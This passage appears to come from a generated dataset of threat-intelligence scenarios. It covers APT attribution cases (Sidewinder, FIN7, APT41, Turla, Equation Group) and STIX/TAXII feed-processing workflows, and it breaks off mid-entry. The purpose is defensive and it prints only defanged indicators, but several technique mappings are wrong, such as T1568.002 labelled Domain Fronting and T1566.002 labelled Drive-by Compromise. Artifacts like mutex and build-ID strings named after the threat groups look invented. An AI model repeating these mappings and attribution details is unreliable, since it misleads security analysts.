- **Impact**: Prevents Office-based attacks
- **Tools**: CISA, MITRE, RTF Inspector, Process Monitor
- **Scenario**: Analysts identify Sidewinder by exploit chain in RTF using known decoy naming and command pattern
- **Attack Steps**: 1. Email received with .rtf attachment titled Military_Brief_2024.rtf.2. RTF Inspector reveals malformed object structure triggering Equation Editor exploit.3. Process Monitor shows parent-child chain from winword.exe to cmd.exe, then powershell.exe.4. PowerShell invokes C2 from domain used in 2023 Sidewinder campaign: missiondata[.]asia.5. Decoy file naming, scripting chain, and use of Office CVE-2017-11882 map directly to Sidewinder TTP.6. MITRE techniques: T1203, T1059.001, T1204.002.7. SOC deploys retroactive hunt across mailboxes and RTF attachments, blocking future variants.
- **Detection**: RTF Inspector, ProcMon
- **Solution**: Harden Office and disable ActiveX
- **Tags**: #Sidewinder #RTFExploit

## Mustang Panda Attribution via DLL Side-load and C2 with CloudFront

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: CloudFront-based C2
- **MITRE**: T1574.002, T1102.002
- **Impact**: Detects misused CDN traffic
- **Tools**: MITRE, VT Graph, Sigcheck, AWS Logs
- **Scenario**: Side-loading DLL uses AWS CloudFront as C2; mapped to Mustang Panda group
- **Attack Steps**: 1. Legitimate signed binary telecomclient.exe side-loads malicious config.dll during user logon.2. Sigcheck validates original EXE signature; DLL is unsigned and not digitally trusted.3. Network analysis shows traffic to CloudFront edge node used as C2 (d12x9a...cloudfront.net).4. MITRE ATT&CK mapping confirms side-loading with cloud service abuse (T1574.002, T1102.002).5. Mustang Panda attribution based on known toolset reusing CloudFront with similar DLL schema.6. VirusTotal Graph shows reused infrastructure and overlapping filenames in previous APT campaigns.7. IOC and TTP added to detection engine, hunting script deployed for all side-loaded binaries in system32 paths.
- **Detection**: AWS Logs, Sigcheck
- **Solution**: Monitor cloud infra usage as C2
- **Tags**: #mustangpanda #cdnc2

## FIN7 Attribution via Scheduled Task Persistence and Injected Scripts

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Batch + LOLBin
- **MITRE**: T1053.005, T1218.010
- **Impact**: Detects scheduled persistence loaders
- **Tools**: Task Scheduler Logs, LOLBAS, Ghidra, MITRE
- **Scenario**: Persistent loader and injected batch files linked to FIN7 toolset using scripting and LOLBins
- **Attack Steps**: 1. Scheduled task created under Microsoft\Windows\UpdateCheck runs hidden batch file.2. Batch script downloads payload from hxxps://cache-windowsupdt[.]com/init.ps1.3. Ghidra confirms the PowerShell logic mimics FIN7’s known stage-0 droppers.4. Batch file uses regsvr32.exe as a LOLBin for stealthy payload registration.5. MITRE mapping aligns with T1053.005, T1218.010, T1105.6. IOC pattern enriched with script structure, LOLBin use, and domain used.7. Task Scheduler monitored for pattern, and regsvr32 abuse signatures added to SIEM.
- **Detection**: Task Logs, Ghidra
- **Solution**: Block scheduled abuse, alert on LOLBins
- **Tags**: #fin7 #lolbas #scheduledtask

## TA505 Attribution via AsyncRAT Delivered with Multi-stage Macro

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Multi-stage Macro
- **MITRE**: T1566.001, T1105
- **Impact**: Blocks commodity RAT delivery
- **Tools**: Any.Run, MISP, MITRE ATT&CK
- **Scenario**: Analysts correlate obfuscated macro chain and AsyncRAT loader to TA505 playbook
- **Attack Steps**: 1. Email contains .xlsm file with hidden macro auto-running on open.2. Macro stages include encoded shellcode with PowerShell delivery mechanism.3. Any.Run dynamic analysis identifies AsyncRAT beacon, mutex, and configuration.4. C2 domain matches TA505's past infrastructure reported in MISP.5. MITRE mapping shows use of T1566.001, T1059.005, T1105.6. Enriched indicators include macro hash, dropper behavior, and beacon signature.7. Network team updates firewall rules, and IOC shared with CERT network.
- **Detection**: Any.Run, MISP
- **Solution**: Alert on dropper behavior patterns
- **Tags**: #ta505 #asyncrat

## APT41 Attribution via Dual Use of Web Shell and Credential Dumping via Procdump

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows Server
- **Vulnerability**: Web Shell + ProcDump
- **MITRE**: T1003.001, T1505.003
- **Impact**: Identifies APT41 post-exploitation
- **Tools**: IIS Logs, Sysmon, ProcDump Logs, MITRE
- **Scenario**: Web shell discovered alongside use of procdump.exe for LSASS dump, linking to APT41
- **Attack Steps**: 1. Analysts find .aspx web shell in inetpub\wwwroot\imgupdate.aspx with post-exec upload logic.2. Sysmon logs show procdump64.exe executed under same user session shortly after.3. Dump file saved as update.dmp in temp folder, analyzed for credential content.4. Domain controller logs show unusual lateral SMB traffic following dump creation.5. MITRE mapping aligns with T1505.003, T1003.001, T1021.002.6. APT41 attribution confirmed via C2 fingerprint and past toolset correlations.7. Web shell hash, dump filename patterns, and toolset indicators shared across IR alliance.
- **Detection**: Sysmon, IIS Logs
- **Solution**: Disable dump tools, harden IIS configs
- **Tags**: #apt41 #webshell #procdump

## APT27 Attribution via Dropper Metadata, Encrypted Payloads, and DGA

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Encrypted Dropper + DGA
- **MITRE**: T1071.004, T1027.002
- **Impact**: Prevents stealthy long-term implants
- **Tools**: Ghidra, MITRE, MISP, DGA Analysis Toolkit
- **Scenario**: Encrypted payloads distributed by a metadata-rich dropper connected to a DGA scheme align with APT27
- **Attack Steps**: 1. An alert from endpoint detection flags a suspicious executable dropped into %APPDATA%\Roaming\comhost.exe. 2. Binary is analyzed in Ghidra, revealing encrypted payloads embedded in .rsrc section with XOR key stored in config structure. 3. Analysts decrypt payloads and identify configuration pointing to dynamic DNS domains (avx12-update[.]biz, avx13-connect[.]cc). 4. DGA toolkit confirms domain generation based on timestamp + machine GUID — a known trait in previous APT27 implants. 5. Dropper metadata contains build ID APT27_COMHOST_V2, identical to previous samples shared by Taiwanese CERT. 6. MITRE mappings include T1027.002 (Obfuscation), T1071.004 (DNS), and T1105 (Remote File Copy). 7. Threat intel enrichment confirms this is a refined version of their 2019 implant “ZxShell”. 8. IOC patterns (dropper hash, domain algorithm seed) pushed to MISP and detection rules updated to flag similar DGAs.
- **Detection**: Ghidra, DGA Monitor
- **Solution**: Flag DGA structures, decrypt payload configs
- **Tags**: #APT27 #DGA #EncryptedPayloads

## APT12 Attribution through Custom Loader Using Rundll32 and Mutex Artifact

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Rundll32-based Loader
- **MITRE**: T1218.011, T1055.002
- **Impact**: Identifies legacy implant use
- **Tools**: ProcMon, Sysmon, Mutex Search, MITRE ATT&CK
- **Scenario**: A loader utilizing rundll32 and a mutex string links attack chain to APT12’s legacy loader frameworks
- **Attack Steps**: 1. Anomalous use of rundll32.exe triggers an alert, showing execution from a temp directory. 2. Process Monitor confirms DLL file injectlib.dll called RunDllEntry and loaded a secondary module via reflective injection. 3. Sysmon logs reveal process chain originates from Outlook's OUTLOOK.EXE, suggesting delivery via malicious attachment. 4. Analysts extract mutex string APT12_BackdoorMutex, which matches sample hashes previously attributed to APT12. 5. Ghidra reveals loader checks for anti-sandbox strings before decryption, a signature technique of APT12’s “Hikit” tool. 6. MITRE techniques used: T1218.011 (Signed Binary Proxy Execution), T1055.002 (DLL Injection), and T1070.004 (Indicator Removal). 7. Historical campaign tracking in MISP confirms reused mutex naming across Southeast Asian targets. 8. SOC crafts a custom detection rule to monitor rundll32 behavior, mutex strings, and temporary DLL injection attempts.
- **Detection**: Sysmon, ProcMon
- **Solution**: Monitor rundll32 usage patterns
- **Tags**: #APT12 #rundll32 #mutex

## OilRig Attribution via Config Extraction of DNS Tunneling Implant

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: DNS Tunneling Implant
- **MITRE**: T1071.004, T1568.002
- **Impact**: Stops covert C2 via DNS
- **Tools**: Suricata, PCAP Analyzer, Ghidra, MISP
- **Scenario**: Custom implant uses DNS tunneling with hardcoded parameters aligning with OilRig’s DNSpionage campaign
- **Attack Steps**: 1. DNS traffic from an endpoint shows excessive TXT queries to analytics-check[.]org. 2. PCAP analysis reveals the queries are encoding binary data in base32 and requesting in consistent 64-byte chunks. 3. Ghidra decompilation of the implant reveals hardcoded config pointing to domains used by OilRig in 2020. 4. The implant contains delay intervals and response handling logic unique to OilRig’s DNSpionage family. 5. MITRE mapping includes T1071.004 (DNS), T1043 (Commonly Used Port), and T1568.002 (Domain Fronting). 6. Threat enrichment includes decoded beacon patterns, payload fragments, and DNS host correlation. 7. IDS rules updated in Suricata to flag 64-byte TXT query intervals and known hostnames. 8. IOC pushed to national CERT database and SIEM rulebase hardened for detection.
- **Detection**: Suricata, PCAP
- **Solution**: Monitor DNS for encoded payloads
- **Tags**: #OilRig #dnsTunneling

## FIN6 Attribution via Memory Scraping Malware on POS Systems

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: POS Terminal
- **Vulnerability**: Memory Scraping + FTP
- **MITRE**: T1040, T1056.001
- **Impact**: Prevents retail card data theft
- **Tools**: Volatility, POS Scanner, MITRE, ThreatGrid
- **Scenario**: POS-specific memory scraping malware tied to FIN6 based on obfuscation and encoded exfil format
- **Attack Steps**: 1. Credit card data breach leads to memory dump analysis of a compromised point-of-sale terminal. 2. Volatility plugin malfind reveals a suspicious injected segment in possvc.exe. 3. Reverse engineering of memory content shows regular expressions targeting magnetic stripe data format (Track 1 and Track 2). 4. Exfil payload is encoded in base64 and transmitted via FTP to external host fin6-exfil[.]biz. 5. MITRE TTPs matched: T1040 (Network Sniffing), T1003.003 (OS Credential Dumping: NTDS), T1056.001 (Keylogging). 6. FIN6 attribution confirmed by code reuse of obfuscation engine from 2018 breaches in U.S. retail chain. 7. Security policy updated to isolate POS terminals, restrict outbound FTP, and log memory anomalies. 8. All encoded card data patterns loaded into SIEM detection for future scrapes.
- **Detection**: Volatility, FTP logs
- **Solution**: Alert on memory scans for card data
- **Tags**: #fin6 #memoryscraper

## StrongPity Attribution via ISO-based Installer Containing Hidden Spyware Layer

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: ISO + Spy DLL
- **MITRE**: T1218.010, T1566.002
- **Impact**: Prevents spyware delivery via fake tools
- **Tools**: MISP, ISO Inspector, PEStudio, Ghidra
- **Scenario**: ISO distributed via fake VPN download contains decoy installer and embedded spyware DLLs
- **Attack Steps**: 1. Users report fake VPN website distributing .iso with setup executable and hidden config.dll. 2. ISO analysis shows autorun script launching setup.exe, which silently drops spyware DLL into %TEMP%. 3. PEStudio flags DLL with obfuscated imports and suspicious export functions (startSpyLoop, updateLogs). 4. Ghidra decryption reveals embedded strings connecting to C2 domain previously attributed to StrongPity. 5. MITRE techniques: T1566.002 (Drive-by Compromise), T1218.010 (Regsvr32), T1056.004 (Input Capture). 6. IOC includes ISO hash, DLL file, and network signature from past StrongPity campaigns in MISP. 7. Detection rule added for suspicious VPN installs, ISO mounts, and hidden DLL activity. 8. User awareness rolled out for secure VPN sources.
- **Detection**: PEStudio, ISO Inspector
- **Solution**: Block ISO execution from email sources
- **Tags**: #StrongPity #isoattack

## Wizard Spider Attribution via Config Pattern in TrickBot Modules

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: TrickBot Config
- **MITRE**: T1053.005, T1105
- **Impact**: Blocks banking malware expansion
- **Tools**: Any.Run, Config Extractor, MITRE, Ghidra
- **Scenario**: TrickBot config containing module strings and delay intervals matched with Wizard Spider campaigns
- **Attack Steps**: 1. SOC receives alert for outbound traffic to IP range tied to TrickBot campaigns. 2. Analysts run infected sample in Any.Run to extract TrickBot configuration modules. 3. Ghidra disassembles loader, exposing config variables including “msb0”, “injectorv2”, and C2 fallback hosts. 4. Delay intervals of 121.2 seconds and encrypted module loader sequence matches prior Wizard Spider TrickBot campaigns. 5. MITRE techniques identified: T1105 (Remote File Copy), T1053.005 (Scheduled Task), T1547.001 (Startup). 6. IOC list enriched with C2 domains, config fields, and injector DLLs. 7. TrickBot detector module pushed to EDR and firewall updated to block fallback IP ranges.
- **Detection**: Ghidra, Any.Run
- **Solution**: Monitor delay intervals, config structures
- **Tags**: #wizardspider #trickbot

## APT3 Attribution via Scripting Language Abuse in Lateral Movement

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Python Compiled Scripts
- **MITRE**: T1047, T1059.006
- **Impact**: Prevents advanced lateral spread
- **Tools**: PyInstaller, Process Monitor, MITRE
- **Scenario**: Python scripts compiled as executables used in credential reuse, linked to APT3
- **Attack Steps**: 1. Analysts detect .exe files with Python compilation signatures executed across multiple systems. 2. PyInstaller analysis reveals embedded Python bytecode, primarily credential reuse functions and subprocess calls. 3. Lateral movement is done using WMI and SMB credential spraying logic. 4. MITRE alignment includes T1021.002 (SMB), T1047 (WMI), and T1059.006 (Python). 5. Attribution made via embedded author metadata and compiled script reuse found in 2017 APT3 campaigns. 6. IOC patterns include bytecode hash, smb_exec.py string markers, and specific WMI call formats. 7. Lateral movement scripts blocked by adding compiled Python signature to antivirus policy.
- **Detection**: PyInstaller, ProcMon
- **Solution**: Block PyInstaller EXEs and WMI exec
- **Tags**: #apt3 #pythonabuse

## Sandworm Attribution via Power Event Trigger and WMI-based Implant

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Event-Triggered Implant
- **MITRE**: T1546.002, T1047
- **Impact**: Detects passive implants
- **Tools**: Windows Logs, WMI Logs, MITRE, ProcMon
- **Scenario**: Implant triggered by power event log entry and executes via WMI tasking, linked to Sandworm
- **Attack Steps**: 1. WMI subscription triggers execution when power status changes (e.g., sleep-to-wake). 2. Analysts track the execution to an EXE dropped in %ProgramData%\syscore\poweragent.exe. 3. PowerAgent uses no persistence files—only WMI class __EventConsumer tied to power event logs. 4. MITRE mapping: T1546.002 (Event Triggered Execution), T1047, T1105. 5. Ghidra reveals strings referencing Sandworm's 2022 toolkit, including KillPowerMode and ResumeMode. 6. IOC list includes WMI consumer class string, EXE hash, and affected power event IDs. 7. WMI monitoring scripts created and forensic snapshots automated for any future events.
- **Detection**: WMI Logs, ProcMon
- **Solution**: Audit WMI triggers, block event links
- **Tags**: #sandworm #wmiimplant

## Turla Attribution via Outlook COM Hijack for Persistence

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: Windows
- **Vulnerability**: Outlook COM Hijack
- **MITRE**: T1137.006, T1112
- **Impact**: Prevents fileless Outlook-based persistence
- **Tools**: Outlook Logs, COM Tracer, MITRE, Autoruns
- **Scenario**: Turla group malware uses Outlook COM object to maintain persistence invisibly
- **Attack Steps**: 1. Malware hooks into Outlook.Application COM object via custom registry key. 2. Upon Outlook launch, script-based payload executes without writing to disk. 3. Registry key at HKCU\Software\Classes\CLSID\{Outlook-UUID} contains encoded VBS payload. 4. MITRE mapping: T1137.006 (Outlook Add-ins), T1059.005 (VBScript), and T1112 (Registry Modification). 5. Attribution based on COM structure, encoded logic, and C2 found in previous Turla campaigns. 6. IOC list includes Outlook COM class UUIDs, registry key paths, and payload behavior. 7. COM interface auditing added and autoruns filtered to alert on Outlook-linked scripts.
- **Detection**: Autoruns, COM Tracer
- **Solution**: Block COM misuse in mail clients
- **Tags**: #turla #comabuse #outlook

## Equation Group Attribution via RC5 Key Pattern in Firmware-Level Implant

- **Attack Type**: TTP Attribution & Enrichment
- **Target**: BIOS
- **Vulnerability**: Firmware RC5 Implant
- **MITRE**: T1542.003
- **Impact**: Detects nation-state firmware implants
- **Tools**: BIOS Dump Tool, Ghidra, MITRE ATT&CK
- **Scenario**: Firmware implant recovered from BIOS with RC5 key structure seen in Equation Group tools
- **Attack Steps**: 1. Incident response team extracts BIOS firmware image from a compromised device using SPI flash reader. 2. Analysts identify hidden section in firmware containing encrypted implant code. 3. Ghidra reveals use of RC5 encryption with key structure and s-box similar to “EquationDrug” family. 4. MITRE mapping shows rare technique T1542.003 (Firmware). 5. Attribution based on cryptographic constants, execution logic, and string reuse across older NSA-linked tools. 6. IOC enriched with RC5 pattern, firmware file hash, and implant offset. 7. Firmware update enforced, with BIOS-level integrity checks implemented across fleet.
- **Detection**: SPI Dump Tools, Ghidra
- **Solution**: Use signed BIOS, validate integrity
- **Tags**: #equationgroup #firmware

## Automating STIX Ingestion from MISP to SIEM

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: SIEM
- **Vulnerability**: Manual threat sync delay
- **MITRE**: T1589, T1595
- **Impact**: Reduces time to detection
- **Tools**: MISP, Splunk, TAXII Server, STIX2 Lib
- **Scenario**: Ingest STIX-formatted threat indicators (IPs, hashes) from MISP via TAXII into SIEM for automated correlation
- **Attack Steps**: 1. MISP platform is configured to expose a TAXII v2.1 endpoint. 2. The blue team installs a TAXII client library using cabby or cti-taxii-client. 3. Using the STIX2 Python library, a scheduled script pulls collections every hour and parses indicators. 4. The STIX objects (Indicator, ObservedData) are validated and transformed into Splunk-compatible JSON via custom parser. 5. Parsed indicators (like malicious domains, SHA256 hashes) are automatically pushed to a Splunk KV Store lookup. 6. A correlation search is created in Splunk to match incoming logs against this dynamically updated lookup. 7. Alerts are triggered when logs show a match with any IOC received in the STIX feed. 8. Analysts receive real-time detection for new threats without manually importing feeds.
- **Detection**: Splunk, MISP
- **Solution**: Match logs with IOCs in STIX
- **Tags**: #MISP #STIX #TAXII #SIEM

## Real-Time Threat Intel Enrichment using Anomali TAXII Feeds

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Endpoint + SIEM
- **Vulnerability**: Contextless alerts
- **MITRE**: T1590, T1584
- **Impact**: Context-rich triage decisions
- **Tools**: Anomali ThreatStream, Elastic SIEM, TAXII Client
- **Scenario**: Ingesting and enriching endpoint alerts with STIX indicators pulled from Anomali TAXII feeds
- **Attack Steps**: 1. An Elastic agent forwards endpoint events to Elastic SIEM. 2. A cron-driven enrichment engine pulls TAXII feed from Anomali every 15 minutes. 3. Feed contains STIX indicators for IPs, file hashes, and threat labels (e.g., APT29, Infostealer). 4. Ingested objects are parsed and indexed into a threat-intel index. 5. When an alert is generated (e.g., file execution), enrichment logic queries the index for relevant context (e.g., "Hash seen in APT29 campaign"). 6. Analysts are provided with threat intelligence tags and first-seen timestamps to support decision making. 7. False positives are reduced due to enhanced attribution. 8. Historical IOC backmatching also surfaces stealthy hits from past logs.
- **Detection**: Elastic SIEM
- **Solution**: Threat tag enrichment in alerts
- **Tags**: #Anomali #TAXII #STIX #Enrichment

## Correlating Multi-Feed STIX Indicators in Central Threat Lake

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Threat Intel Lake
- **Vulnerability**: Isolated feeds
- **MITRE**: T1589.001
- **Impact**: Multi-source IOC correlation
- **Tools**: MISP, ThreatFox, IBM X-Force, Postgres, TAXII Client
- **Scenario**: Ingesting multiple STIX sources (MISP, ThreatFox, IBM X-Force) and correlating overlapping threat indicators
- **Attack Steps**: 1. A custom pipeline is set up to poll multiple TAXII servers using feed-specific credentials. 2. Each source is parsed and STIX objects extracted with custom stix2 parsers. 3. The STIX data is normalized into a shared PostgreSQL threat lake with deduplication logic. 4. Matching logic runs hourly to identify overlapping indicators (e.g., same IP seen in multiple feeds). 5. A score is calculated for each IOC based on how many feeds and sources confirm it. 6. Analysts can now prioritize threats with multi-source backing. 7. Alerting engine is integrated with the threat lake to provide source attribution in detections. 8. Entire workflow is documented and reviewed for compliance readiness.
- **Detection**: TAXII Client, Postgres
- **Solution**: Deduplicate and tag STIX entries
- **Tags**: #STIX #multi-source #ThreatFox

## Automation of STIX Campaign Tag Mapping in MISP

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Threat Intel Platform
- **Vulnerability**: Manual campaign tracking
- **MITRE**: T1584, T1585
- **Impact**: Auto-tags threats with campaign info
- **Tools**: MISP, Python STIX2, Graph Builder
- **Scenario**: Automatically tagging IOCs based on campaign metadata (actor, malware) in imported STIX
- **Attack Steps**: 1. MISP is configured to accept incoming STIX bundles from trusted partners. 2. Each bundle contains IOCs along with Campaign and ThreatActor relationships. 3. A background job is triggered in MISP to analyze relationships (e.g., hash → used by → malware → used in campaign X). 4. Based on these links, each IOC is tagged with campaign metadata like "APT38", "CryptoLaundering", etc. 5. These tags flow into downstream tools like TheHive and Cortex, supporting enriched response. 6. Analysts no longer manually trace campaign linkages across entities. 7. Visualization dashboard shows tag frequency by campaign and actor. 8. New correlation logic highlights which campaigns are actively updating their TTPs.
- **Detection**: MISP, Python
- **Solution**: Map IOC→Actor→Campaign
- **Tags**: #STIX #campaign #MISP #automation

## Detecting STIX Format Misuse from Unvetted Feeds

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Open Threat Feeds
- **Vulnerability**: Malformed STIX
- **MITRE**: T1589.001
- **Impact**: Avoids corrupt threat data ingestion
- **Tools**: STIX Validator, TAXII Ingestor, JSON Schema
- **Scenario**: Detecting malformed or ambiguous STIX indicators imported from unverified open feeds
- **Attack Steps**: 1. Organization adds several open TAXII feeds from community forums. 2. Some STIX bundles include invalid indicator-type values or mismatched TLP markings. 3. A nightly script validates STIX bundles using JSON schema checks and STIX2 validator. 4. Any bundle failing validation is excluded and alerts are logged. 5. Analysts review failures and request corrections from feed owners or drop the source entirely. 6. False positives are reduced by filtering malformed indicators. 7. Compliance team ensures only TLP:WHITE or GREEN data is processed. 8. Secure feed policy is enforced across all ingestion scripts.
- **Detection**: STIX2 Validator
- **Solution**: Validate all TAXII bundle formats
- **Tags**: #TAXII #STIX #validation

## Feed Versioning and Diffing for STIX Collections

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: STIX Repo
- **Vulnerability**: Untracked feed evolution
- **MITRE**: T1586, T1595.002
- **Impact**: Tracks threat data lifecycle
- **Tools**: TAXII Diff Engine, Git-like Store
- **Scenario**: Detecting IOC additions and deletions in STIX feeds using object diffing across TAXII collection versions
- **Attack Steps**: 1. TAXII server stores versions of STIX collections per pull cycle. 2. A diff engine compares daily snapshots to identify added, updated, or removed indicators. 3. Analysts view changes using a Git-like interface: added IOCs in green, removed in red. 4. Alerting rules are adapted based on newly added threats. 5. IOC retirement logic ensures outdated hashes are pruned from detection rules. 6. Historical comparisons show which threats were transient vs persistent. 7. SOC uses version data to justify dwell time analysis. 8. Documentation flow is maintained for audit purposes.
- **Detection**: Git Backend, TAXII
- **Solution**: Use versioning to track IOC churn
- **Tags**: #IOCdiff #STIXversioning

## Leveraging STIX Course-of-Action Objects to Automate Playbooks

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: SOAR / TheHive
- **Vulnerability**: Manual playbook mapping
- **MITRE**: T1585.001
- **Impact**: Shortens response time
- **Tools**: TheHive, Cortex, SOAR, STIX2 Lib
- **Scenario**: Using embedded "course-of-action" (CoA) STIX objects to trigger playbook tasks in SOAR
- **Attack Steps**: 1. STIX bundles from MISP include course-of-action objects like "block IP", "isolate host". 2. TheHive parses these actions via a connector and pushes them to Cortex for execution. 3. CoA ID is mapped to playbook step (e.g., IP block triggers firewall rule automation). 4. Analysts approve or deny playbook execution with one click. 5. Playbook branching logic is applied based on threat confidence or actor attribution. 6. Execution logs are written back to STIX bundle for full loop integration. 7. Reduction in MTTR is recorded across several incidents. 8. Analysts also learn from CoA reuse across similar campaigns.
- **Detection**: Cortex, STIX2
- **Solution**: Map CoA to automation task
- **Tags**: #STIX #CoA #SOAR

## Threat Feed Prioritization using STIX Confidence Scores

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Threat Feed Aggregator
- **Vulnerability**: No IOC prioritization
- **MITRE**: T1591.002
- **Impact**: Prevents alert fatigue
- **Tools**: TAXII Client, Confidence Filter, MISP
- **Scenario**: Using confidence fields in STIX to filter and prioritize threat indicators
- **Attack Steps**: 1. STIX indicators often carry a confidence score (e.g., "High", "Moderate", "Low"). 2. Ingestion engine filters out any indicators below a predefined threshold (e.g., discard Low confidence). 3. Moderate indicators are marked for analyst review before deployment. 4. High confidence IOCs are auto-enriched and sent to EDR rulesets. 5. Analysts maintain transparency by reviewing the confidence lineage (e.g., source org, last seen). 6. Score-weighted correlation increases signal-to-noise ratio in alerts. 7. Confidence threshold tuning is done monthly based on incident trends. 8. Compliance team reviews filter policies against threat model.
- **Detection**: TAXII Puller
- **Solution**: Filter by STIX confidence score
- **Tags**: #STIX #confidence #prioritize

## IOC Deconfliction across Federated STIX Feeds

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Multi-Feed Threat Platform
- **Vulnerability**: Conflicting attribution
- **MITRE**: T1592.002
- **Impact**: Avoids IOC attribution errors
- **Tools**: MISP, STIX Mapper, JSON Diff
- **Scenario**: Detecting conflicting indicators (same hash with different threat labels) across federated STIX sources
- **Attack Steps**: 1. Feeds from 4 different vendors are ingested daily into a central MISP instance. 2. An IOC deconfliction module checks for hash duplication across feeds. 3. If the same hash is marked as "APT29" in one feed and "CryptoMiner" in another, conflict is flagged. 4. STIX markings, confidence levels, and external_references are reviewed. 5. Analysts determine the most credible attribution and update IOC metadata. 6. Updated threat labels are propagated to EDR and SIEM. 7. Daily conflict report is generated for audit. 8. Vendors are notified of conflicting labels via TAXII feedback loop.
- **Detection**: STIX Mapper
- **Solution**: Detect conflicting IOC tags
- **Tags**: #IOCdeconflict #STIX

## Importing STIX into Neo4j for TTP Relationship Graphs

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Graph DB
- **Vulnerability**: Disconnected threat context
- **MITRE**: T1591.001, T1584
- **Impact**: Reveals attacker logic visually
- **Tools**: Neo4j, stix2graph, GraphQL
- **Scenario**: Ingesting STIX bundles into a Neo4j graph to visualize relationships between malware, actors, IOCs
- **Attack Steps**: 1. TAXII pulled STIX bundles are ingested into a Neo4j database using stix2graph parser. 2. Nodes are created for all entities (Malware, Campaign, Threat Actor, Indicator, CoA). 3. Edges map relationships (e.g., Malware→uses→Tool, Indicator→detects→Malware). 4. Analysts query relationships to find “shortest path” between IOC and actor. 5. TTP clustering reveals which actors share TTPs and tools. 6. Visualization helps explain threat context to management. 7. Graph score metrics are used to weight threats for prioritization. 8. Graph auto-refreshes daily to reflect feed updates.
- **Detection**: Neo4j, STIX2Graph
- **Solution**: Build interactive TTP maps
- **Tags**: #STIX #Neo4j #threatgraph

## Linking STIX ThreatActor Entities to Active Campaigns in a CTI Dashboard

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: CTI Dashboard
- **Vulnerability**: Flat incident mapping
- **MITRE**: T1595.001
- **Impact**: Enhances threat tracking visuals
- **Tools**: STIX2, TheHive, Custom Dashboard
- **Scenario**: Visualizing threat actor activities using STIX relationships mapped to active incidents
- **Attack Steps**: 1. TAXII feed pulls STIX objects that include ThreatActor, Campaign, AttackPattern, and ObservedData objects. 2. A script maps these relationships and assigns incident IDs in TheHive accordingly. 3. ThreatActor objects (e.g., "APT33") are linked via STIX relationship objects to Campaigns and IOCs. 4. The dashboard pulls these mappings and displays a heatmap of actor activity across asset classes. 5. Analysts click into visual nodes to explore which TTPs and indicators are being actively seen. 6. This interactive view accelerates decision-making in large-scale incident management. 7. Alerts from SIEM that match these indicators are auto-tagged with the actor and campaign name. 8. Documentation is maintained for attribution justifications, enhancing threat brief quality.
- **Detection**: TheHive, Dashboard API
- **Solution**: Actor-to-incident visual linking
- **Tags**: #ThreatActor #STIX #campaignmap

## Role-Based Filtering of STIX Content Using TLP Tags

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Threat Feed Portal
- **Vulnerability**: Overexposed threat intel
- **MITRE**: T1589.002
- **Impact**: Maintains data classification integrity
- **Tools**: MISP, TAXII, TLP Policy Engine
- **Scenario**: Automatically restricting STIX data visibility based on TLP (Traffic Light Protocol) levels
- **Attack Steps**: 1. STIX feeds often carry TLP markings: WHITE, GREEN, AMBER, RED. 2. The ingestion engine parses these fields during TAXII pull. 3. Users are assigned roles (e.g., L1 analyst, external vendor) with TLP thresholds. 4. AMBER and RED data are only available to Tier-3 SOC and intel teams. 5. A middleware engine checks user role before displaying threat data or enabling alerts. 6. Audit logs are maintained to track data visibility for compliance. 7. Feed originators are notified if TLP escalation (e.g., RED to GREEN) is performed. 8. The system ensures sensitive threat intel is not exposed to unintended parties.
- **Detection**: MISP, Access Layer
- **Solution**: Filter visibility via TLP
- **Tags**: #TLP #RBAC #STIXcontrol

## Alert Generation from STIX ObservedData Objects with Time Decay

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Alert Engine
- **Vulnerability**: Stale indicators trigger alerts
- **MITRE**: T1591.004
- **Impact**: Reduces false alerts from old IOCs
- **Tools**: MISP, Custom TAXII Parser, Alert Engine
- **Scenario**: Creating alerts only for fresh indicators based on ObservedData timestamps and valid_until fields
- **Attack Steps**: 1. STIX ObservedData objects are ingested, each carrying timestamps and an optional valid_until field. 2. A parser filters out expired indicators that fall beyond their intended observability. 3. For fresh indicators (last_observed within 48 hrs), the system cross-references active logs. 4. Alerts are generated only for matches within the time window, reducing false positives. 5. Analysts receive alerts with embedded metadata about original timestamp, source, and expiration. 6. Expired indicators are moved to cold storage and not used for alerting. 7. This structure supports temporal awareness and threat freshness. 8. Alert engine provides scoring based on recency and observation frequency.
- **Detection**: ObservedData + Parser
- **Solution**: Enforce time-window matching
- **Tags**: #timeaware #STIX #observeddata

## IOC Conversion Pipeline from STIX to Sigma/YARA Rules

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Rule Engine
- **Vulnerability**: Manual rule creation
- **MITRE**: T1586.002
- **Impact**: Scalable detection rule generation
- **Tools**: stix2sigma, YARA Builder, Git Repo
- **Scenario**: Automatically transforming STIX indicators into detection rules for Sigma or YARA
